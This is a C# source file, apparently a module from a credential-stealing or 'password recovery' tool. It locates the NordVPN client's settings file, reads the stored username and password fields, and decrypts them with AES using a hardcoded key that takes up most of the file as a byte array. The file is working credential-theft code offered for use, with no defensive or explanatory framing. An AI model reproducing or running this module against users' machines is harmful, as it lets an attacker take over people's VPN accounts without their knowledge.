using System;
using System.IO;
using System.Text.RegularExpressions;

namespace recv
{
    /// <summary>
    /// v5.56
    /// </summary>
    public static class NordVPN
    {
        private static string config = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\NordVPN\\settings.ini";

        /// <summary>
        /// Check if the config file exists
        /// </summary>
        /// <returns>True/False</returns>
        private static bool isInstalled()
        {
            return File.Exists(config);
        }

        /// <summary>
        /// Retrieve config value
        /// </summary>
        /// <param name="key"></param>
        /// <returns></returns>
        private static string getConfigValue(string key)
        {
            if (isInstalled())
            {
                string settings = File.ReadAllText(config);
                return Regex.Match(settings, "^" + key + "=(.*?)$", RegexOptions.Multiline).Groups[1].Value;
            }else
            {
                return string.Empty;
            }
        }

        /// <summary>
        /// Recover NordVPN username
        /// </summary>
        /// <returns></returns>
        public static string recoverUsername()
        {
            if (!isInstalled()) return string.Empty;
            return Crypto.DecryptAES(getConfigValue("name").ToBytes(), Key);
        }

        /// <summary>
        /// Return NordVPN password
        /// </summary>
        /// <returns></returns>
        public static string recoverPassword()
        {
            if (!isInstalled()) return string.Empty;
            return Crypto.DecryptAES(getConfigValue("password").ToBytes(), Key);
        }

        /// <summary>
        /// NordVPN hardcoded encryption key
        /// </summary>
        private static byte[] Key = new byte[]
        {
            48,
            49,
            50,
            51,
            52,
            53,
            99,
            100,
            101,
            102,
            103,
            104,
            54,
            55,
            56,
            57,
            97,
            98,
            48,
            49,
            50,
            51,
            52,
            53,
            99,
            100,
            101,
            102,
            103,
            104,
            54,
            55,
            56,
            57,
            97,
            98,
            48,
            49,
            50,
            51,
            52,
            53,
            99,
            100,
            101,
            102,
            103,
            104,
            54,
            55,
            56,
            57,
            97,
            98,
            48,
            49,
            50,
            51,
            52,
            53,
            99,
            100,
            101,
            102,
            103,
            104,
            54,
            55,
            56,
            57,
            97,
            98,
            48,
            49,
            50,
            51,
            52,
            53,
            99,
            100,
            101,
            102,
            103,
            104,
            54,
            55,
            56,
            57,
            97,
            98,
            48,
            49,
            50,
            51,
            52,
            53,
            99,
            100,
            101,
            102,
            103,
            104,
            54,
            55,
            56,
            57,
            97,
            98,
            48,
            49,
            50,
            51,
            52,
            53,
            99,
            100,
            101,
            102,
            103,
            104,
            54,
            55,
            56,
            57,
            97,
            98
        };
    }
}
